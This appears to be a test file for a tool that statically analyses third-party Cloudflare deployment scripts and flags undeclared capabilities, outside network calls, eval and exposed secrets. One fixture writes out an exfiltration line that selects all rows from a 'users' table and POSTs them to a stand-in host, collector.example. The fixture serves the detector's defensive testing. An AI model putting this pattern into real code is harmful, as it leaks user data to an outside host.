// SPDX-License-Identifier: AGPL-3.0-or-later
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as
// published by the Free Software Foundation, either version 3 of the
// License, or (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program. If not, see <https://www.gnu.org/licenses/>.

// The analyser's report is shown to someone deciding whether to point a
// stranger's code at their own Cloudflare account, so both directions are
// tested: that it finds what is there, and that it admits when it cannot tell.
// A scan that quietly reports nothing is the failure that matters.

import { analyzePackage } from "../../src/lib/analyze/analyze";
import { validateRecipe } from "../../src/lib/recipe/schema";
import type { Recipe } from "../../src/lib/recipe/types";
import { PACKAGE_ARTIFACT_NAME } from "../../shared/package";

type Json = Record<string, unknown>;

function build(overrides: Json = {}): Recipe {
  const base: Json = {
    schema: 1,
    id: "demo",
    name: "Demo",
    summary: { "*": "A demo package" },
    version: "1.0.0",
    tag: "v1.0.0",
    buildTime: "2026-01-01T00:00:00Z",
    package: { artifact: PACKAGE_ARTIFACT_NAME, sha256: "a".repeat(64) },
    license: { id: "AGPL-3.0-or-later", text: "Licence text." },
    permissions: [
      {
        key: "scripts",
        requirement: "required",
        groups: ["Workers Scripts Write"],
        label: { "*": "Workers Scripts" },
        scenario: { "*": "Upload the Worker" },
        scope: "account",
        level: "write",
      },
    ],
    resources: [
      { id: "db", kind: "d1", binding: "DB", defaultName: "${worker}-db", required: true, label: { "*": "Database" } },
    ],
    worker: { defaultName: "demo", module: "worker/index.js" },
    capabilities: ["d1"],
    steps: [{ id: "schema", label: { "*": "Create the schema" } }],
  };
  const validated = validateRecipe({ ...base, ...overrides });
  if (!validated.ok) throw new Error(`fixture is not a valid recipe: ${validated.errors.join("; ")}`);
  return validated.recipe;
}

const DEPLOY = (body: string) => `export async function deploy(ctx) {\n${body}\n}`;

function codes(recipe: Recipe, script: string): string[] {
  return analyzePackage(recipe, script).findings.map((finding) => finding.code);
}

// ---------------------------------------------------------------------------

const plain = analyzePackage(build(), DEPLOY('  await ctx.d1.provision("db");'));

const undeclared = analyzePackage(
  build({ capabilities: ["d1"] }),
  DEPLOY('  await ctx.d1.provision("db");\n  await ctx.worker.uploadVersion();'),
);

const unused = analyzePackage(build({ capabilities: ["d1", "cron"] }), DEPLOY('  await ctx.d1.provision("db");'));

const renamed = analyzePackage(build(), DEPLOY('  const c = ctx;\n  await c.d1.provision("db");'));

const destructured = analyzePackage(
  build(),
  `export async function deploy(ctx) {\n  const { provision } = ctx.d1;\n  await provision("db");\n}`,
);

const computed = analyzePackage(build(), DEPLOY('  const name = "d1";\n  await ctx[name].provision("db");'));

const exfiltrating = analyzePackage(
  build(),
  DEPLOY('  const rows = await ctx.d1.query("db", "select * from users");\n  await fetch("https://collector.example:8443/in", { method: "POST", body: JSON.stringify(rows) });'),
);

const assembled = analyzePackage(build(), DEPLOY("  await fetch(`https://collector.example/${ctx.ctx.workerName}`);"));

const opaque = analyzePackage(build(), DEPLOY("  await fetch(host + path);"));

const dynamic = analyzePackage(build(), DEPLOY('  eval("1 + 1");'));

const broken = analyzePackage(build(), "export async function deploy(ctx) { this is not javascript");

const listedCheck = analyzePackage(
  build({
    checks: [{ id: "r2on", requirement: "required", label: { "*": "R2" }, path: "/accounts/${accountId}/r2/buckets" }],
  }),
  DEPLOY('  await ctx.d1.provision("db");'),
);

const unlistedCheck = analyzePackage(
  build({
    checks: [
      { id: "members", requirement: "required", label: { "*": "Members" }, path: "/accounts/${accountId}/members" },
    ],
  }),
  DEPLOY('  await ctx.d1.provision("db");'),
);

const malformedCheck = analyzePackage(
  build({
    checks: [{ id: "odd", requirement: "optional", label: { "*": "Odd" }, path: "//accounts/x/tokens/verify" }],
  }),
  DEPLOY('  await ctx.d1.provision("db");'),
);

const tokenCheck = analyzePackage(
  build({
    checks: [
      {
        id: "script",
        requirement: "optional",
        label: { "*": "Script" },
        path: "/accounts/${accountId}/workers/scripts/${worker}",
      },
    ],
  }),
  DEPLOY('  await ctx.d1.provision("db");'),
);

const handsOverToken = analyzePackage(
  build({
    capabilities: ["d1", "secrets"],
    hostSecrets: [
      { name: "CF_API_TOKEN", source: "apiToken", requirement: "required", reason: { "*": "To manage itself" } },
    ],
  }),
  DEPLOY('  await ctx.secrets.putHostValue("CF_API_TOKEN");'),
);

const passwordVar = analyzePackage(
  build({
    inputs: [{ id: "adminpw", kind: "password", label: { "*": "Admin password" }, generate: 16 }],
    worker: { defaultName: "demo", module: "worker/index.js", vars: [{ name: "ADMIN_PW", value: "${input:adminpw}" }] },
  }),
  DEPLOY('  await ctx.d1.provision("db");'),
);

const checks: Array<[string, boolean, string?]> = [
  ["a matching declaration and script raises nothing", plain.findings.length === 0, plain.findings.map((f) => f.code).join(", ")],
  ["the declared capability is reported as used", plain.capabilities.some((entry) => entry.capability === "d1" && entry.used)],
  ["the wizard's own endpoints are always listed", plain.endpoints.some((entry) => entry.via.includes("host"))],
  [
    "a declared capability contributes its endpoints",
    plain.endpoints.some((entry) => entry.id === "d1.databaseCreate" && entry.via.includes("d1")),
  ],
  [
    "the permission needed is derived, not copied from the recipe",
    plain.permissions.some((need) => need.groups.length === 1 && need.groups[0] === "D1 Write"),
    plain.permissions.map((need) => need.groups.join("/")).join(" | "),
  ],
  ["a full read is reported as certain", plain.certain],

  ["calling an undeclared capability is serious", codes(build({ capabilities: ["d1"] }), DEPLOY("  await ctx.worker.uploadVersion();")).includes("undeclaredCapability")],
  [
    "the undeclared capability is the one that will be refused",
    undeclared.capabilities.some((entry) => entry.capability === "worker" && !entry.declared && entry.used),
  ],
  [
    "an undeclared capability contributes no endpoint",
    !undeclared.endpoints.some((entry) => entry.via.includes("worker")),
  ],
  ["a declared but unused capability is flagged", unused.findings.some((finding) => finding.code === "unusedCapability")],

  ["renaming ctx does not hide a call", renamed.capabilities.some((entry) => entry.capability === "d1" && entry.used)],
  [
    "destructuring a namespace does not hide a call",
    destructured.capabilities.some((entry) => entry.capability === "d1" && entry.used),
  ],
  ["computed access is admitted rather than ignored", computed.script.computedAccess && !computed.certain],

  [
    "a literal exfiltration target is reported with its port",
    exfiltrating.network.some((target) => target.origin === "https://collector.example:8443" && target.via === "fetch"),
    exfiltrating.network.map((target) => target.origin).join(", "),
  ],
  ["contacting an outside address is flagged", exfiltrating.findings.some((finding) => finding.code === "ownNetwork")],
  [
    "an address finished at run time is reported as partial",
    assembled.network.some((target) => target.origin === "https://collector.example" && target.partial),
  ],
  ["an unreadable address is counted, not dropped", opaque.script.opaqueNetwork === 1 && !opaque.certain],
  ["turning data into code is flagged", dynamic.findings.some((finding) => finding.code === "dynamicCode") && !dynamic.certain],
  [
    "a script that does not parse says so and claims nothing",
    !broken.script.parsed && !broken.certain && broken.findings.some((finding) => finding.code === "scriptUnparsed"),
  ],

  [
    "a check on a listed endpoint resolves to it",
    listedCheck.checks[0]?.endpoint === "r2.bucketList" && listedCheck.findings.length === 0,
    listedCheck.findings.map((f) => f.code).join(", "),
  ],
  [
    "a check on an unlisted endpoint is flagged as unreachable",
    unlistedCheck.checks[0]?.endpoint === null && unlistedCheck.findings.some((finding) => finding.code === "unknownCheckEndpoint"),
  ],
  [
    "a required unreachable check is serious, not a warning",
    unlistedCheck.findings.find((finding) => finding.code === "unknownCheckEndpoint")?.severity === "critical",
  ],
  [
    "a check path the wizard will not send is flagged",
    malformedCheck.checks[0]?.malformed === true && malformedCheck.findings.some((finding) => finding.code === "malformedCheckPath"),
  ],
  [
    "a placeholder nothing substitutes is flagged",
    tokenCheck.findings.some((finding) => finding.code === "checkTokenUnresolved"),
    tokenCheck.findings.map((f) => f.code).join(", "),
  ],

  [
    "handing the API token to the deployed app is serious",
    handsOverToken.findings.some((finding) => finding.code === "hostSecretCredential" && finding.severity === "critical"),
  ],
  [
    "a generated password landing in a plain var is flagged",
    passwordVar.findings.some((finding) => finding.code === "passwordInVar"),
    passwordVar.findings.map((f) => f.code).join(", "),
  ],

  [
    "findings are ordered worst first",
    undeclared.findings.length > 0 && undeclared.findings[0].severity === "critical" && undeclared.worst === "critical",
  ],
];

let failures = 0;
for (const [label, passed, detail] of checks) {
  if (passed) console.log(`  PASS ${label}`);
  else {
    failures++;
    console.error(`  FAIL ${label}${detail ? ` — ${detail}` : ""}`);
  }
}

console.log(`${checks.length - failures}/${checks.length} assertions passed`);
if (failures > 0) {
  console.error(`${failures} FAILURE(S)`);
  process.exit(1);
}
